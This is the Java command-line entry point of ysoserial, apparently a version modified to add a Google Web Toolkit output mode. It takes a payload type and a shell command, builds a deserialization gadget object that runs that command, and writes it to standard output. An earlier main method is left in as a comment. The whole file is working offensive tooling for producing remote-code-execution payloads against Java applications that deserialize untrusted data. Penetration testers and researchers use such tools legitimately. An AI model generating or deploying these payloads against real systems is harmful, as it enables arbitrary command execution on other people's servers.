package ysoserial;

import java.io.PrintStream;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.ParseException;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	/* public static void main(final String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
		if (args.length < 2) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		String serializationMode = "java";
		String gwtFieldName = "default";
		
		for (int i = 0; i < args.length - 1; i++)
		{
			if (args[i].equals("--gwt"))
			{
				serializationMode = "gwt";
				gwtFieldName = args[i + 1];
			}
		}
		
		final String payloadType = args[args.length - 2];
		final String command = args[args.length - 1];

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			PrintStream out = System.out;
			if (serializationMode == "java")
			{
				Serializer.serialize(object, out);
			}
			else if (serializationMode == "gwt")
			{
				GWTSerializer.serialize(object, out, gwtFieldName);
			}
			else
			{
				System.err.println("Unknown serialization mode '" + serializationMode + "'");
				System.exit(1);
			}
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	} */

	public static void main(final String[] argv) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        CommandLine commandLine = null;
        Options options = new Options();
		String serializationMode = "java";
		String gwtFieldName = "default";

		Option gwt = Option.builder("G")
            .longOpt("gwt")
            .numberOfArgs(1)
            .argName("Class=str")
            .desc("Output Google Web Toolkit (GWT) serialization format using the following field name")
            .build();
        Option help = Option.builder("h")
            .longOpt("help")
            .desc("Print usage")
            .build();

        options.addOption(gwt);
        options.addOption(help);

        CommandLineParser parser = new DefaultParser();
        try {
            commandLine = parser.parse(options, argv);
        } catch (ParseException exp) {
            System.err.println("Unexpected exception:" + exp.getMessage());
            System.exit(USAGE_CODE);
        }
        String [] args = commandLine.getArgs();
        if (args.length != 2 || commandLine.hasOption("help")) {
            printUsage();
            System.exit(USAGE_CODE);
        }

		// it only makes sense to have one field name, so use the last one if the option was specified multiple times
		if(commandLine.hasOption("gwt")) {
			serializationMode = "gwt";
            String [] propvalues = commandLine.getOptionValues("gwt");
            for (String propvalue : propvalues) {
                gwtFieldName = propvalue;
            }
        }

        final String payloadType = args[0];
        final String command = args[1];

        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage();
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            PrintStream out = System.out;
			if (serializationMode == "java")
			{
				Serializer.serialize(object, out);
			}
			else if (serializationMode == "gwt")
			{
				GWTSerializer.serialize(object, out, gwtFieldName);
			}
			else
			{
				System.err.println("Unknown serialization mode '" + serializationMode + "'");
				System.exit(1);
			}
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private static void printUsage() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        System.err.println("Y SO SERIAL?");
        System.err.println("Usage: java -jar ysoserial-[version]-all.jar [options] <payload> '<command>'");
        System.err.println("  Options:");
        System.err.println("    -h,--help                  Print usage\n");
        System.err.println("    -G,--gwt <field name>      Output in Google Web Toolkit (GWT) serialization format:\n"+
                           "      ex. --gwt default\n");
        System.err.println("  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
            new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
